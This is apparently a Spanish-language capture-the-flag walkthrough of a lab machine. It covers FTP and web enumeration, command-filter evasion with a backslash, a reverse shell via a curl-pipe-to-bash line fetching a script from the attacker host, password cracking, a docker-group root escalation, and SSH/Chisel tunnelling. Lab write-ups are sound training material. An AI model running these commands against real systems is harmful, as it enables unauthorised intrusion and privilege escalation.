Escaneamos con nmap
![[Pasted image 20240602111714.png]]

Encontramos 3 puertos abiertos, 21, 22 y 80, revisando encontramos que esta activado el modo anonimo en el puerto 21
![[Pasted image 20240602111915.png]]

Encontramos un fichero que al descargarlo aparentemento podemos ver dos posibes usuarios, `Apaar` y `Anurodh
![[Pasted image 20240602111946.png]]

Ahora revisaremos el puerto 80, revisamos la web y no encontramos nada especial, realizamos fuzzing
![[Pasted image 20240602112219.png]]

Encontramos algo interesante, hay una ruta escondida llamada secret la cual nos permite ejecutar ciertos comandos, para revisar que comandos podemos ejecutar utilizaremos BurpSuite, capturamos la peticion
![[Pasted image 20240602113017.png]]

Una vez capturada copiamos la respuesta y lo pegamos en intruder y modificamos el campo a sustitiuir
![[Pasted image 20240602113138.png]]

Una vez echo esto vamos a Payloads y configuramos el ataque
![[Pasted image 20240602113308.png]]

Una vez preparado lo ejecutamos y vemos el resultado de los comandos que podemos ejecutar
![[Pasted image 20240602113610.png]]

Ahora intentaremos obtener una reverse shell, pero antes revisamos y encontramos que antes de ejecutar un comando añadimos `\` nos saltamos el filtro de comandos
![[Pasted image 20240602120223.png]]

Como vemos tenemos el archivo index.php, lo leemos y la pestaña que aparece es la siguiente
![[Pasted image 20240602120303.png]]

Si inspeccionamos el codigo podemos ver que ahora aparece algo diferente
![[Pasted image 20240602120335.png]]

Ahora si que vamos a buscar obtener una reverse shell, primero creamos el fichero y lanzamos un servidor de python
![[Pasted image 20240602122553.png]]

Ahora ejecutando el siguiente comando obtendremos la reverse shell
```Bash
curl http://10.9.0.126:80/shell.sh | b\ash
````

Verificamos que se ha descargado
![[Pasted image 20240602122700.png]]

Y aqui tenemos la reverse shell generada
![[Pasted image 20240602122748.png]]

Antes de continuar creamos una TTY estable y totalmente funcional
[[TTY Interactiva]]

Una vez obtenida la TTY completa pasaremos a la fase de post explotación

Comenzamos revisando los binarios
![[Pasted image 20240602124440.png]]

Revisamos el fichero /etc/passwd
![[Pasted image 20240602124506.png]]

Revisamos la carpeta home y encontramos que existen 3 usuarios
![[Pasted image 20240602124628.png]]

Revisamos los puertos internos abiertos y encontramos un localhost
![[Pasted image 20240602124554.png]]

Revisamos los binarios ejecutables y encontramos el archivo helploine.sh el cual se puede ejecutar con sudo sin password
![[Pasted image 20240602124656.png]]

Lo analizamos
![[Pasted image 20240602124853.png]]

Ahora lo ejecutamos con los permisos del usuario apaar para obtener la flag de user
```Bash
sudo -u apaar /home/apaar/.helpline.sh
```
![[Pasted image 20240602125240.png]]

Ahora podremos seguir dos rutas que nos llevaran al mismo lugar, nosotros realizaremos las dos para explotar por completo la maquina.

Revisando la maquina victima encontramos un fichero sospechoso en la ruta `/var/www/files`en el fichero hacker.php
![[Pasted image 20240603075600.png]]

Nos descargamos el fichero creando un servidor de python
![[Pasted image 20240603075716.png]]
![[Pasted image 20240603075745.png]]

Una vez descargado utilizaremos steghide para revisar si hay algo oculto en la images y vemos que nos descarga un archivo llamado backup.zip protegido por contraseña
![[Pasted image 20240603075910.png]]

La crackearemos con John the ripper, con el siguiente comando primero generamos un hash para luego romperlo
```bash
zip2john backup.zip > backup_hash.txt
```
![[Pasted image 20240603080224.png]]

Y ahora con john crackeamos la paswword
```Bash
john backup_hash.txt --wordlist=/home/wolf/rockyou.txt
```
![[Pasted image 20240603080414.png]]

Lo descomprimimos y obtenemos un fichero llamado source_code.php
![[Pasted image 20240603080553.png]]

Leemos el fichero y encontramos una password en base64
![[Pasted image 20240603080639.png]]

Lo descodificamos y obtenemos las credenciales del usuario anurodh
```bash
echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d 
```
![[Pasted image 20240603080752.png]]

Lo comprobamos y efectivamente esa es su password
![[Pasted image 20240603081011.png]]

Revisamos los privilegios y encontramos que esta en el grupo de docker
![[Pasted image 20240603081126.png]]

Ejecutando el siguiente comando obtendremos una bash con privilegios de root
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
![[Pasted image 20240603081231.png]]


# Ruta alternativa
Ahora seguiremos una ruta distinta a la cual obtendremos la misma imagen, anteriormente hemos enumerado que había un puerto abierto en la maquina victima
![[Pasted image 20240602124554.png]]

Revisando la captura anterior encontramos el puerto interno 9001 abierto como localhost, para conectarnos necesitamos hacer un tunel inverso, lo haremos de dos maneras distinas, una con SSH y la otra con el binario Chisel

## Crear tunel inverso con SSH
Primero creamos las llaves de SSH
```Bash
ssh-keygen -f id_rsa
```
![[Pasted image 20240603090123.png]]

Copiamos la id de la clave publica
```Bash
cat id_rsa.pub
```
![[Pasted image 20240603090212.png]]

Añadimos la clave publica al fichero de `authorized_keys`
![[Pasted image 20240603090538.png]]
![[Pasted image 20240603093712.png]]

A la clave privada le añadimos los permisos `600`
```Bash
chmod 600 id_rsa
```
![[Pasted image 20240603095740.png]]

Y ahora ya podremos conectarnos con el siguiente comando
```Bash
ssh -i id_rsa -L 9001:127.0.0.1:9001 apaar@10.10.93.142
```
![[Pasted image 20240603095818.png]]

Ahora si accedemos al navegador y escribimos la ruta del puerto que hemos conectado por el puente veremos lo que hay configurado
![[Pasted image 20240603095905.png]]

## Crear tunel con Chisel
Para poder crear un tunel con chisel primero es necesario tener el binario en las dos maquinas, como apunte a tener en cuenta, el binario tiene que ser compatible con la arquetectura del sistema, en este caso uno es amd para la victima y el otro es arm para la maquina atacante, podemos transferir el fichero por un servidor de python

Aquí lo tenemos en la maquina atacante
![[Pasted image 20240603101617.png]]

Y aqui en la maquina victima
![[Pasted image 20240603102122.png]]


Una vez esta creado levantamos un servidor en la maquina atacante
```bash
./chisel server -p 8000 --reverse
```
![[Pasted image 20240603102321.png]]

Y para conectarnos desde la maquina victima usaremos el siguiente comando
```bash
./chisel client 10.9.0.138:8000 R:9001:127.0.0.1:9001
```
![[Pasted image 20240603102512.png]]

Si volvemos donde hemos levantado el servidor aparecera la conexión creada
![[Pasted image 20240603102601.png]]

Y ya podríamos acceder a nuestro servicio desde nuestra maquina atacante
![[Pasted image 20240603102640.png]]


Continuando con la maquina si ahora realizamos un SQLI accederemos al portal
![[Pasted image 20240603103014.png]]

Al inciar sesión nos aparecera la siguiente pestaña
![[Pasted image 20240603103057.png]]

Como podemos ver es otra manera de ver la imagen que previamente habiamos descargado desde la ruta y desde aqui podriamos descargarla
